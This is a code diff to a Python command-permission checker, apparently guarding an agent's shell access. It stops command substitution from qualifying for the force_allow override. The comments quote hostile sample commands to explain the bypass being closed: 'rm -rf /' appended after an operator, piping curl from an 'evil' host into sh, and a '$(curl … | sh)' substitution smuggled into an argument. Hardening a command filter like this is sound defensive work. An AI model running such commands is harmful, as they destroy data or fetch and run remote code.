@@ -164,6 +164,13 @@ def _unquoted(command: str) -> str:
     return re.sub(r"'[^']*'|\"[^\"]*\"", '""', command)
 
 
+# Command substitution is executable even inside double quotes ($(...),
+# ${...}, and `...` all run in either quoting context — single quotes are the
+# only inert shell), so its presence disqualifies a command from force_allow
+# regardless of where it appears.
+_CMD_SUBSTITUTION = re.compile(r"`|\$\(|\$\{")
+
+
 def _static_block(command: str) -> Optional[str]:
     bare = _unquoted(command)
     for rx in _STATIC_BLOCK_RES:
@@ -189,12 +196,19 @@ def _compile_res(patterns) -> list:
 
 
 def _overrides(cfg, command):
-    # force_allow honors only operator-free commands (shell operators outside
-    # quotes): a pattern with a permissive tail (e.g. `(?:\s.*)?`) must not be
-    # satisfiable by appending `&& rm -rf /` or ` ; curl evil | sh`. Operator
-    # commands fall through to the normal layers — this only ever adds
-    # scrutiny, never removes it.
-    if not re.search(r"[|;&`$><\n]", _unquoted(command)):
+    # force_allow honors only operator-free commands: shell operators outside
+    # quotes (a pattern with a permissive tail like `(?:\s.*)?` must not be
+    # satisfiable by appending `&& rm -rf /` or ` ; curl evil | sh`), and —
+    # checked on the ORIGINAL text, since quoting is not a shell-safe
+    # boundary — any command substitution: `...`, $(...), ${...} all execute
+    # inside double quotes, so `hermes cron status "$(curl … | sh)"` must not
+    # hit the built-in `hermes cron` pattern. Disqualified commands fall
+    # through to the normal layers — this only ever adds scrutiny, never
+    # removes it.
+    if (
+        not re.search(r"[|;&`$><\n]", _unquoted(command))
+        and not _CMD_SUBSTITUTION.search(command)
+    ):
         for rx in _compile_res(cfg["force_allow_patterns"]):
             if rx.search(command):
                 return "allow"
